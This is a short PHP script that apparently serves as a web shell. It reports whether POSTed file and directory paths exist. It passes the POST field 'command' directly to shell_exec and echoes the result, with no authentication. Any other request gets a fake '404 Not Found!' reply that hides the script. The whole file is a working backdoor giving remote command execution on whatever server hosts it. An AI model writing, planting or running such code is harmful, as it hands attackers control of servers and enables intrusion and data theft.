<?php
if($_POST){

  if($_POST['file']!="404"){
     if(is_file($_POST['file']))
     {
      echo '200';
     } 
     
     else{ echo '404';};
  }
  
  if($_POST['dir']!="404"){
  if(is_dir($_POST['dir']))
  {
  echo '200';
  } 
  
  else{ echo '404';};
  }
  
  if($_POST["command"]!="404"){
    echo shell_exec($_POST["command"]);
  }
}

else{
 echo '404 Not Found!';
}
?>